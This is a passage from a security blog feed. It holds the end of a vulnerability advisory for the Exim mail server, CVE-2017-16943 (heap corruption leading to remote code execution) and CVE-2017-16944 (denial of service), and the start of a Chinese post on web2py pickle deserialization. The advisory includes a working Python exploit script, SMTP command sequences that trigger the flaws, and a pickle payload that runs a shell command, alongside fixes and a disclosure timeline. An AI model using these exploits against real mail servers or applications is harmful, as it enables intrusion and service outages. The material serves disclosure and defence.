  &lt;/li&gt;
  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_getc&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string_printing&lt;/code&gt;. 
 &lt;img src=&quot;/assets/img/blog/20171211/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg until extension and bug triggered
 In this way, while we keep sending huge messages, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; allocated chunks after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt;, and therefore &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt; is overwritten to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt; of libc (linked list pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; points back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; if no other freed chunk exists). 
 &lt;img src=&quot;/assets/img/blog/20171211/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg for the next extension
 When the next extension occurs, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; tries to cut from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;, which makes attackers able to overwrite all global variables below main_arena.&lt;/li&gt;
  &lt;li&gt;Overwrite global variables in libc&lt;/li&gt;
  &lt;li&gt;Finish sending message and trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt;
 In the PoC, we simply modified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and ended the line. Exim calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset&lt;/code&gt; to reset the buffer and calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt;. At this stage, we successfully controlled instruction pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rip&lt;/code&gt;.
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_IO_2_1_stdout_&lt;/code&gt;. We forged the vtable of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; and set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; to any call of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fflush(stdout)&lt;/code&gt; inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rip&lt;/code&gt; and the content of first argument. 
 We consulted past CVE exploits and decided to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expand_string&lt;/code&gt;, which executes command with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execv&lt;/code&gt; if we set the first argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, and finally we got our RCE. 
 &lt;img src=&quot;/assets/img/blog/20171211/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;exploit-for-default-configured-exim&quot;&gt;Exploit for default configured exim&lt;/h4&gt;
&lt;p&gt;When dkim is disabled, the PoC above fails because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is the last chunk on heap. This makes the system merge it into a big chunk called &lt;strong&gt;top chunk&lt;/strong&gt; rather than unsorted bin.
The illustrations below describe the difference of heap layout:
&lt;img src=&quot;/assets/img/blog/20171211/8.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.&lt;/p&gt;

&lt;p&gt;After running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Use DATA command to send lots of data
 Send huge data, make the chunk big and extend many times. After several extension, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.&lt;/li&gt;
  &lt;li&gt;End DATA transfer and start a new email
 Restart to send an email with BDAT command after the heap chunk is prepared.&lt;/li&gt;
  &lt;li&gt;Adjust &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; again
 Send invalid command with an unprintable charater again to cut the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Finally the heap layout is like:
&lt;img src=&quot;/assets/img/blog/20171211/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we can go back to the step 2 at the beginning and create the same situation. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.
The following is the PoC for default configured exim:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1280&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;DATA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;itself&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;b&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3480&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;BDAT 1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A demo of our exploit is as below.
&lt;img src=&quot;/assets/img/blog/20171211/7-demo.png&quot; alt=&quot;&quot; /&gt;
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.&lt;/p&gt;

&lt;h1 id=&quot;incorrect-bdat-data-handling-leads-to-dos&quot;&gt;Incorrect BDAT data handling leads to DoS&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis-1&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;When receiving data with BDAT command, SMTP server should not consider a single dot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‘.’&lt;/code&gt; in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
250 OK
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is not reset. If the next command is also a BDAT, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lwr_receive_getc&lt;/code&gt; become the same and an infinite loop occurs inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;. Program crashes due to stack exhaustion.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546&quot;&gt;smtp_in.c: 546 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if (chunking_data_left &amp;gt; 0)
    return lwr_receive_getc(chunking_data_left--);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 100
.
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 0 LAST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This makes attackers able to launch a resource based DoS attack and then force the whole server down.&lt;/p&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Turn off Chunking option in config file:
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chunking_advertise_hosts =
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Update to 4.89.1 version&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16943 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16944 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;23 November, 2017 09:40 Report to Exim Bugzilla&lt;/li&gt;
  &lt;li&gt;25 November, 2017 16:27 CVE-2017-16943 Patch released&lt;/li&gt;
  &lt;li&gt;28 November, 2017 16:27 CVE-2017-16944 Patch released&lt;/li&gt;
  &lt;li&gt;3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;remarks&quot;&gt;Remarks&lt;/h4&gt;
&lt;p&gt;While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.&lt;/p&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://bugs.exim.org/show_bug.cgi?id=2199
https://bugs.exim.org/show_bug.cgi?id=2201
https://nvd.nist.gov/vuln/detail/CVE-2017-16943
https://nvd.nist.gov/vuln/detail/CVE-2017-16944
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WEB2PY 反序列化的安全問題－CVE-2016-3957</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在一次滲透測試的過程中，我們遇到了用 web2py 框架建構的應用程式。為了成功滲透目標，我們研究了 web2py，發現該框架範例應用程式中存在三個資訊洩漏問題，這些洩漏都會導致遠端命令執行 (RCE)。由於範例應用程式預設是開啟的，若沒有手動關閉，攻擊者可以直接利用洩漏資訊取得系統執行權限。這些問題編號分別為：CVE-2016-3952、CVE-2016-3953、CVE-2016-3954、CVE-2016-3957。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;背景老生常談的-pickle-code-execution&quot;&gt;背景－老生常談的 Pickle Code Execution&lt;/h3&gt;

&lt;p&gt;在繼續說明前必須要先認知什麼是反序列化的安全問題？反序列化的安全問題在本質上其實是物件注入，它的嚴重性取決於所注入的物件本身是否會造成危險行為，例如讀寫檔。一般來說要透過反序列化建構一個成功的攻擊有兩個要點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;是否可控制目標所要反序列化的字串。&lt;/li&gt;
  &lt;li&gt;危險行為在反序列化後是否會被執行。這在實務上大概有下面兩種情形：
    &lt;ul&gt;
      &lt;li&gt;危險行為是寫在魔法方法 (Magic Method) 裡面，例如 PHP 的 __construct 在物件生成時一定會執行。&lt;/li&gt;
      &lt;li&gt;反序列化後覆蓋既有物件，導致正常程式流程出現危險結果。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;反序列化的問題在每個程式語言都會發生，但通常需要搭配看程式碼拼湊出可以用的攻擊流程，比較難利用。不過，某些實作序列化的函式庫會將程式邏輯也序列化成字串，因此攻擊者可以自定義物件直接使用，不再需要拼湊，例如今天要提的 Python Pickle。&lt;/p&gt;

&lt;p&gt;直接舉個 Pickle 的例子如下，我們製造了一個會執行系統指令 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo success&lt;/code&gt; 的物件 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;，並且序列化成字串 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;cposix\nsystem\np1\n(S&apos;echo success&apos;\np2\ntp3\nRp4\n.&quot;&lt;/code&gt;。當受害者反序列化這個字串，即觸發執行該系統指令，因此印出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;success&lt;/code&gt;。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
